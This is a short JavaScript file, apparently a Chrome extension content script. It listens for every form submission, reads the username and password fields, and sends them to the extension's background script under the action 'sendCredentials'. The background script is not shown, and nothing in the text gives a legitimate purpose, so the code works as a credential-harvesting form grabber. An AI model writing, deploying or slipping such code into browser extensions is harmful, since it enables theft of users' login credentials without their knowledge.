document.addEventListener("submit", function(event) {
  if (event.target.tagName === "FORM") {
    const usernameField = event.target.querySelector('input[name="user_name"]');
    const passwordField = event.target.querySelector('input[name="password"]');
    
    if (usernameField && passwordField) {
      const username = usernameField.value;
      const password = passwordField.value;

      // Send data to background script
      chrome.runtime.sendMessage({
        action: "sendCredentials",
        username: username,
        password: password
      });
    }
  }
});


